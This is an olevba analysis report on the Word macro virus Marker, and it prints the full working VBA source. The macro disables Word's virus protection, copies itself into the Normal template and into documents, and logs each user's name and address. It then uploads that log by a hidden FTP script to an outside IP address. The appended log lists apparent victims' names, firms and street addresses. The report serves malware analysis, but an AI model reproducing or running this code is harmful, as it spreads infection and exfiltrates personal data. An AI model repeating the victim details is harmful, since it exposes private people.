olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-6122ff9d968b0271a809d0e1b25e76a28b72f66d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-6122ff9d968b0271a809d0e1b25e76a28b72f66d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.codemodule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.codemodule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.codemodule.Lines(1, ad.codemodule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.codemodule.Lines(1, nt.codemodule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.codemodule.Lines(1, ad.codemodule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.codemodule.deletelines 1, nt.codemodule.CountOfLines
    nt.codemodule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.codemodule.Lines(1, nt.codemodule.CountOfLines)

    ad.codemodule.deletelines 1, ad.codemodule.CountOfLines
    ad.codemodule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 03:07:26 PM - Tuesday, 22 Dec 1998
' BCBSA
'



' 03:28:02 PM - Wednesday, 6 Jan 1999
' BCBSA
'



' 02:59:47 PM - Monday, 11 Jan 1999
' Marsha Veach
'



' 01:54:54 PM - Wednesday, 20 Jan 1999
' Connie Sandifer, CMP
'



' 09:33:06 PM - Monday, 25 Jan 1999
' Doug Rowan
'



' 08:21:12 AM - Wednesday, 27 Jan 1999
' IMSI
'



' 10:59:58 AM - Friday, 29 Jan 1999
' Raj
'



' 03:37:57 PM - Saturday, 30 Jan 1999
' hornd
'



' 01:26:48 PM - Tuesday, 2 Feb 1999
' Cooley Godward
'



' 10:15:22 AM - Thursday, 4 Feb 1999
' Cooley Godward
'



' 11:30:22 AM - Thursday, 4 Feb 1999
' Cooley Godward
'



' 09:53:02 AM - Monday, 8 Feb 1999
' Cooley Godward
'



' 04:24:34 PM - Monday, 8 Feb 1999
' Cooley Godward
'



' 11:28:52 AM - Tuesday, 9 Feb 1999
' Cooley Godward
'



' 08:18:09 AM - Wednesday, 10 Feb 1999
' BEVERLYG
'



' 03:33:30 PM - Wednesday, 10 Feb 1999
' Bon Appetit
' Bon Appétit Mgmt. Co.
' East Coast Regional Office
' 5123 State Rte 233
' Westmoreland, NY 13490



' 10:16:02 PM - Friday, 5 Mar 1999
' Mitch Green
' MItch Green
' 419 Delta Rd #4
' Amherst, NY 14226



' 02:00:12 PM - Tuesday, 9 Mar 1999
' Valued Gateway Client
'



' 01:01:05 AM - Friday, 12 Mar 1999
' Valued Gateway Client
'



' 08:39:55 PM - Monday, 22 Mar 1999
' Academic Computing
'



' 05:07:06 PM - Wednesday, 24 Mar 1999
' STN08
'



' 06:14:48 PM - Thursday, 25 Mar 1999
' Academic Computing
'



' 02:57:14 PM - Wednesday, 31 Mar 1999
' Stephanie Meade
'



' 01:04:25 PM - Tuesday, 14 Sep 1999
' Institute for Advanced Studies
'



' 10:39:27 AM - Friday, 22 Oct 1999
' Brian McGlynn
'



' 04:02:37 AM - Monday, 6 Dec 1999
' blmcglyn
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

